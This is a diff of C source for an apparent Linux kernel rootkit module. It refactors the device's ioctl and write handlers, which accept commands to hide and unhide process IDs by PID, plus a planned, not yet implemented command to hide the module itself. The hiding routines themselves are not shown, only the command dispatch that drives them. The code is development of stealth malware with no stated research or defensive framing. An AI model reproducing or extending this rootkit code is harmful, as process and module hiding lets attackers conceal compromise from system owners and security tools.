@@ -18,20 +18,18 @@
 
 #include <linux/fs.h>
 #include <linux/kernel.h>
-#include <linux/string.h>
 #include <linux/version.h>
 
 #include "logging.h"
 #include "types.h"
+#include "ctrl/ctrl.h"
 #include "device/details/cdev_utils.h"
 #include "device/details/file_ops.h"
-#include "device/details/ioctl_cmd.h"
-#include "device/details/parser.h"
 
 long dev_ioctl(struct file* p_file, unsigned int cmd, unsigned long arg)
 {
-    rc_t err = 0;
-    rc_t retval = 0;
+    int err = 0;
+    int retval = 0;
     pid_t pid;
     module_dev_t* p_dev;
 
@@ -73,7 +71,7 @@ long dev_ioctl(struct file* p_file, unsigned int cmd, unsigned long arg)
             return retval;
         }
         p_dev = p_file->private_data;
-        retval = ioc_hide_pid(p_dev, pid);
+        retval = ioc_hide_proc(p_dev, pid);
         break;
     case CROC_IOC_SHOW_PID:
         retval = __get_user(pid, (pid_t __user*)arg);
@@ -81,7 +79,7 @@ long dev_ioctl(struct file* p_file, unsigned int cmd, unsigned long arg)
             return retval;
         }
         p_dev = p_file->private_data;
-        retval = ioc_show_pid(p_dev, pid);
+        retval = ioc_show_proc(p_dev, pid);
         break;
     case CROC_IOC_HIDE_MOD:
         /* @todo    Implement */
@@ -153,28 +151,30 @@ ssize_t dev_write(struct file* p_file, const char __user* p_buf, size_t count, l
 		return -EFAULT;
 	}
 
-    rc = parse_cmd(buffer, count, &cmd, &arg);
+    rc = parse_str_cmd(buffer, count, &cmd, &arg);
     if (rc != 0) {
         KLOG_DEBUG(LOG_PREFIX "device::dev_read: failed to parse command; reason %d", rc);
         return rc;
     }
 
-    if (cmd & CROC_IOC_PID) {
-        if (cmd & CROC_IOC_HIDE_CMD) {
-            rc = ioc_hide_pid(p_dev, arg);
-            KLOG_DEBUG(LOG_PREFIX "device::dev_read: pid %ld has been hidden with result %d", arg, rc);
-        } else if (cmd & CROC_IOC_SHOW_CMD) {
-            rc = ioc_show_pid(p_dev, arg);
-            KLOG_DEBUG(LOG_PREFIX "device::dev_read: pid %ld has been showed with result %d", arg, rc);
-        } else {
-            return -EFAULT;
-        }
-    } else if (cmd & CROC_IOC_MOD) {
+    switch (cmd) {
+    case CROC_IOC_HIDE_PID_CMD:
+        rc = ioc_hide_proc(p_dev, arg);
+        KLOG_DEBUG(LOG_PREFIX "device::dev_read: pid %ld has been hidden with result %d", arg, rc);
+        break;
+    case CROC_IOC_SHOW_PID_CMD:
+        rc = ioc_show_proc(p_dev, arg);
+        KLOG_DEBUG(LOG_PREFIX "device::dev_read: pid %ld has been showed with result %d", arg, rc);
+        break;
+    case CROC_IOC_HIDE_MOD_CMD:
+    case CROC_IOC_SHOW_MOD_CMD:
         /* @todo    Implement */
-    } else if (cmd & CROC_IOC_LOG) {
+        break;
+    case CROC_IOC_LOG:
         SET_LOGF_LEVEL(arg);
         KLOG_DEBUG(LOG_PREFIX "device::dev_read: setted log level %ld", arg);
-    } else {
+        break;
+    default:
         return -EFAULT;
     }
 
